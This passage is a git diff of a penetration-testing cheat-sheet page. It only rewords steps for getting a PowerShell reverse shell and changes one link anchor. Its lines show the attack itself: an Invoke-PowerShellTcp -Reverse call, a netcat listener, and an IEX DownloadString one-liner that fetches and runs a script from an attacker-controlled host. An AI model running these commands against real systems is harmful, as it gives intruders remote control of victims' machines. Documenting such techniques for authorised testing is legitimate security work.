@@ -339,10 +339,10 @@ Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>
 
 On your local machine:
 
-- You create an HTTP server to serve the script: `python -m http.serve`
-- You listen for an incoming [connection with nc](./reverse-shell.md).
+- Create an HTTP server to serve the script: `python -m http.serve`
+- Listen for an incoming [connection with nc](reverse-shell.md#listen-with-netcat).
 
-And on the remote host, you execute the following PowerShell script:
+On the remote host, execute the following PowerShell script:
 
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
